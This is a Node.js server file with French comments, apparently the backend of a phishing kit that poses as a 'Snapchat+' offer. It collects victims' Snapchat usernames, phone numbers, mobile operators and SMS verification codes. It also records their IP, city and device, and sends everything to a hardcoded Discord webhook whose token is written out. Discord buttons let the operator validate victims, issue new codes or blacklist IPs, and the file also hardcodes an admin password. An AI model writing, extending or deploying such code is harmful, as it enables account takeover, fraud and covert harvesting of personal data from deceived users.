// ============================================================
// 🔒 SERVEUR SÉCURISÉ SNAPCHAT+ - SERVER.JS
// ============================================================

const express = require('express');
const cors = require('cors');
const session = require('express-session');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = 3000;

// ============================================================
// 📌 CONFIGURATION - CHANGE ICI !
// ============================================================

const ADMIN_PASSWORD = 'ton_mot_de_passe_ultra_securise_123';
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1524148679207030944/oPLTlS0JxfehRfsd-LNSw2PJOrLE_RBqYXbHMKKEAesBTxa-Jp909ZMq4rY61W1W0ngM';

// ============================================================
// 💾 STOCKAGE (en mémoire - remplace par une DB plus tard)
// ============================================================

const submissions = new Map();
const blacklist = new Set();

// ============================================================
// 🛠️ MIDDLEWARE
// ============================================================

app.use(cors({
  origin: ['http://localhost:8000', 'https://snap-post-hub.base44.app'],
  credentials: true
}));
app.use(express.json());
app.use(express.static('public'));

app.use(session({
  secret: crypto.randomBytes(32).toString('hex'),
  resave: false,
  saveUninitialized: false,
  cookie: {
    secure: process.env.NODE_ENV === 'production',
    httpOnly: true,
    maxAge: 24 * 60 * 60 * 1000,
    sameSite: 'strict'
  }
}));

// ============================================================
// 📝 FONCTIONS UTILITAIRES
// ============================================================

function generateId() {
  return Date.now().toString(36) + crypto.randomBytes(8).toString('hex');
}

function generateCode() {
  return String(Math.floor(1000 + Math.random() * 9000));
}

function getClientInfo(req) {
  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.ip || req.connection.remoteAddress || 'Inconnue';
  const userAgent = req.headers['user-agent'] || 'Inconnu';
  const isMobile = /Mobile|Tablet|Phone/i.test(userAgent);
  const browser = userAgent.split(' ').slice(-1)[0] || 'Inconnu';
  const device = isMobile ? '📱 Téléphone' : '💻 Ordinateur';
  return { ip, browser, device, userAgent };
}

async function getGeoInfo(ip) {
  try {
    const res = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,city,isp`);
    const data = await res.json();
    if (data.status === 'success') {
      return { country: data.country || 'France', city: data.city || 'Inconnue', isp: data.isp || 'Inconnu' };
    }
  } catch (e) {}
  return { country: 'France', city: 'Inconnue', isp: 'Inconnu' };
}

async function sendToDiscord(embed, components = null) {
  try {
    const payload = { embeds: [embed] };
    if (components) payload.components = components;
    
    await fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
  } catch (e) {
    console.error('Erreur webhook:', e);
  }
}

function isAdmin(req) {
  return req.session && req.session.authenticated === true;
}

// ============================================================
// 🔐 ROUTES ADMIN
// ============================================================

// Login admin
app.post('/api/admin/login', (req, res) => {
  const { password } = req.body;
  
  if (password === ADMIN_PASSWORD) {
    req.session.authenticated = true;
    req.session.adminSince = Date.now();
    return res.json({ success: true });
  }
  
  res.status(401).json({ error: 'Mot de passe incorrect' });
});

// Logout admin
app.post('/api/admin/logout', (req, res) => {
  req.session.destroy();
  res.json({ success: true });
});

// Vérifier si admin est connecté
app.get('/api/admin/check', (req, res) => {
  res.json({ authenticated: isAdmin(req) });
});

// ============================================================
// 📊 ROUTES SOUMISSIONS
// ============================================================

// Créer une soumission (frontend)
app.post('/api/submit', async (req, res) => {
  const { username, phone, operator } = req.body;
  
  if (!username || !phone || !operator) {
    return res.status(400).json({ error: 'Champs manquants' });
  }
  
  // Vérifier la blacklist
  const { ip } = getClientInfo(req);
  if (blacklist.has(ip)) {
    return res.status(403).json({ error: 'IP blacklistée' });
  }
  
  const id = generateId();
  const code = generateCode();
  const geo = await getGeoInfo(ip);
  const { browser, device, userAgent } = getClientInfo(req);
  
  const submission = {
    id,
    username,
    phone,
    operator,
    code,
    status: 'pending',
    createdAt: new Date().toISOString(),
    ip,
    geo,
    browser,
    device,
    userAgent
  };
  
  submissions.set(id, submission);
  
  // Envoyer à Discord
  const embed = {
    title: '🔑 Nouvelle soumission Snapchat+',
    color: 0xFFB800,
    fields: [
      { name: '👻 Utilisateur', value: `@${username}`, inline: true },
      { name: '📡 Opérateur', value: operator, inline: true },
      { name: '📞 Numéro', value: `+33${phone.replace(/^0/, '')}`, inline: true },
      { name: '🌍 Pays', value: geo.country || 'France', inline: true },
      { name: '🏙️ Ville', value: geo.city || 'Inconnue', inline: true },
      { name: '🕵️ IP', value: ip || 'Inconnue', inline: true },
      { name: '🌐 Navigateur', value: browser || 'Inconnu', inline: true },
      { name: '💾 Appareil', value: device || 'Inconnu', inline: true },
      { name: '🕐 Date', value: new Date().toLocaleString('fr-FR'), inline: false },
      { name: '🔢 Code', value: `||${code}||`, inline: false }
    ],
    footer: { text: `ID: ${id}` },
    timestamp: new Date().toISOString()
  };
  
  const components = [
    { type: 1, components: [
      { type: 2, style: 3, label: '✅ Valider', custom_id: `validate_${id}` },
      { type: 2, style: 4, label: '❌ Refuser', custom_id: `reject_${id}` },
      { type: 2, style: 2, label: '🔄 Nouveau code', custom_id: `newcode_${id}` }
    ]},
    { type: 1, components: [
      { type: 2, style: 2, label: '🔢 SFR Format', custom_id: `sfr_${id}` },
      { type: 2, style: 2, label: '🔢 Orange Format', custom_id: `orange_${id}` },
      { type: 2, style: 2, label: '🔢 Xbox Format', custom_id: `xbox_${id}` }
    ]},
    { type: 1, components: [
      { type: 2, style: 4, label: '🚫 Blacklist', custom_id: `blacklist_${id}` }
    ]}
  ];
  
  await sendToDiscord(embed, components);
  
  res.json({ success: true, id, code });
});

// Soumettre un code (frontend)
app.post('/api/verify', async (req, res) => {
  const { id, code } = req.body;
  
  if (!id || !code) {
    return res.status(400).json({ error: 'ID et code requis' });
  }
  
  const submission = submissions.get(id);
  if (!submission) {
    return res.status(404).json({ error: 'Soumission introuvable' });
  }
  
  submission.code = code;
  submission.status = 'code_submitted';
  submissions.set(id, submission);
  
  // Envoyer à Discord
  const embed = {
    title: '🔑 Code SMS entré',
    color: 0xFF6B00,
    fields: [
      { name: '👻 Utilisateur', value: `@${submission.username}`, inline: true },
      { name: '📡 Opérateur', value: submission.operator, inline: true },
      { name: '📞 Numéro', value: `+33${submission.phone.replace(/^0/, '')}`, inline: true },
      { name: '🔢 Code entré', value: `||${code}||`, inline: true },
      { name: '🌍 Pays', value: submission.geo.country || 'France', inline: true },
      { name: '🏙️ Ville', value: submission.geo.city || 'Inconnue', inline: true },
      { name: '🕵️ IP', value: submission.ip || 'Inconnue', inline: true },
      { name: '🌐 Navigateur', value: submission.browser || 'Inconnu', inline: true },
      { name: '💾 Appareil', value: submission.device || 'Inconnu', inline: true },
      { name: '🕐 Date', value: new Date().toLocaleString('fr-FR'), inline: false }
    ],
    footer: { text: `ID: ${id}` },
    timestamp: new Date().toISOString()
  };
  
  await sendToDiscord(embed);
  
  res.json({ success: true, status: submission.status });
});

// Obtenir les soumissions (admin)
app.get('/api/submissions', (req, res) => {
  if (!isAdmin(req)) {
    return res.status(401).json({ error: 'Non autorisé' });
  }
  
  const all = Array.from(submissions.values());
  res.json(all);
});

// Obtenir une soumission (admin)
app.get('/api/submissions/:id', (req, res) => {
  if (!isAdmin(req)) {
    return res.status(401).json({ error: 'Non autorisé' });
  }
  
  const submission = submissions.get(req.params.id);
  if (!submission) {
    return res.status(404).json({ error: 'Soumission introuvable' });
  }
  
  res.json(submission);
});

// ============================================================
// 🎯 ROUTES INTERACTIONS DISCORD (webhook)
// ============================================================

app.post('/api/interaction', async (req, res) => {
  const { type, data } = req.body;
  
  if (type === 2) { // Interaction bouton
    const customId = data.custom_id;
    const [action, id] = customId.split('_');
    
    const submission = submissions.get(id);
    if (!submission) {
      return res.json({ type: 4, data: { content: '❌ Soumission introuvable', flags: 64 } });
    }
    
    switch (action) {
      case 'validate': {
        submission.status = 'approved';
        submissions.set(id, submission);
        
        await sendToDiscord({
          title: '✅ Validation réussie !',
          color: 0x22c55e,
          fields: [
            { name: '👻 Utilisateur', value: `@${submission.username}`, inline: true },
            { name: '📡 Opérateur', value: submission.operator, inline: true },
            { name: '🔢 Code', value: `||${submission.code}||`, inline: true }
          ],
          footer: { text: `Validé par admin` }
        });
        
        return res.json({ type: 4, data: { content: `✅ Validation réussie pour @${submission.username}`, flags: 64 } });
      }
      
      case 'reject': {
        submission.status = 'rejected';
        submissions.set(id, submission);
        
        await sendToDiscord({
          title: '❌ Demande refusée',
          color: 0xef4444,
          fields: [
            { name: '👻 Utilisateur', value: `@${submission.username}`, inline: true }
          ],
          footer: { text: `Refusé par admin` }
        });
        
        return res.json({ type: 4, data: { content: `❌ Refusé pour @${submission.username}`, flags: 64 } });
      }
      
      case 'newcode': {
        const newCode = generateCode();
        submission.code = newCode;
        submission.status = 'pending';
        submissions.set(id, submission);
        
        // Ici tu peux envoyer le nouveau code par SMS via un service
        await sendToDiscord({
          title: '🔄 Nouveau code généré',
          color: 0x3b82f6,
          fields: [
            { name: '👻 Utilisateur', value: `@${submission.username}`, inline: true },
            { name: '🔢 Nouveau code', value: `||${newCode}||`, inline: true }
          ],
          footer: { text: `ID: ${id}` }
        });
        
        return res.json({ type: 4, data: { content: `🔄 Nouveau code: ${newCode}`, flags: 64 } });
      }
      
      case 'blacklist': {
        blacklist.add(submission.ip);
        submission.status = 'blacklisted';
        submissions.set(id, submission);
        
        await sendToDiscord({
          title: '🚫 Blacklist ajoutée',
          color: 0x000000,
          fields: [
            { name: '👻 Utilisateur', value: `@${submission.username}`, inline: true },
            { name: '🕵️ IP', value: submission.ip || 'Inconnue', inline: true }
          ],
          footer: { text: `Blacklisté par admin` }
        });
        
        return res.json({ type: 4, data: { content: `🚫 ${submission.ip} blacklisté`, flags: 64 } });
      }
      
      case 'sfr':
      case 'orange':
      case 'xbox': {
        const format = action === 'sfr' ? 'SFR' : action === 'orange' ? 'ORANGE' : 'XBOX';
        const newCode = generateCode();
        submission.code = newCode;
        submissions.set(id, submission);
        
        await sendToDiscord({
          title: `📱 Format ${format}`,
          color: 0x8b5cf6,
          fields: [
            { name: '👻 Utilisateur', value: `@${submission.username}`, inline: true },
            { name: '📡 Opérateur', value: submission.operator, inline: true },
            { name: '🔢 Code', value: `||${newCode}||`, inline: true },
            { name: '📦 Format', value: format, inline: true }
          ],
          footer: { text: `ID: ${id}` }
        });
        
        return res.json({ type: 4, data: { content: `📱 Format ${format} envoyé pour @${submission.username}`, flags: 64 } });
      }
      
      default: {
        return res.json({ type: 4, data: { content: '⚠️ Action inconnue', flags: 64 } });
      }
    }
  }
  
  res.json({ type: 4, data: { content: '⚠️ Requête inconnue', flags: 64 } });
});

// ============================================================
// 🚀 DÉMARRAGE DU SERVEUR
// ============================================================

app.listen(PORT, '0.0.0.0', () => {
  console.log(`✅ Serveur démarré sur http://0.0.0.0:${PORT}`);
  console.log(`🔗 Interface: http://localhost:${PORT}`);
  console.log(`🔑 Mot de passe admin: ${ADMIN_PASSWORD}`);
  console.log(`📡 Webhook Discord: ${WEBHOOK_URL.slice(0, 60)}...`);
});